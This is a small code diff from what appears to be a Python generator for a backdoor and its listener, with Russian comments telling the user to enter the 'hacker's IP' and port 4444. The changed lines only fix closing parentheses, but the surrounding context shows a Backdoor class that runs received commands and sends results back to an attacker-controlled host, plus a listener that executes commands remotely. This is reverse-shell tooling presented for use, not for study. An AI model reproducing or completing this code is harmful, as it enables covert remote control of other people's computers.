@@ -233,7 +233,7 @@ class Listener:
 			result = self.execute_remotely(command)
 			print(result)
 my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
-my_listener.go() """	k.close()
+my_listener.go() """)	k.close()
 			print('Готово')
 			break
 				
@@ -274,7 +274,7 @@ class Backdoor:
 			self.reliable_send(command_result)
 	
 my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера обезательно!
-my_backdoor.run() """
+my_backdoor.run() """)
 			n.close()
 			break
 				
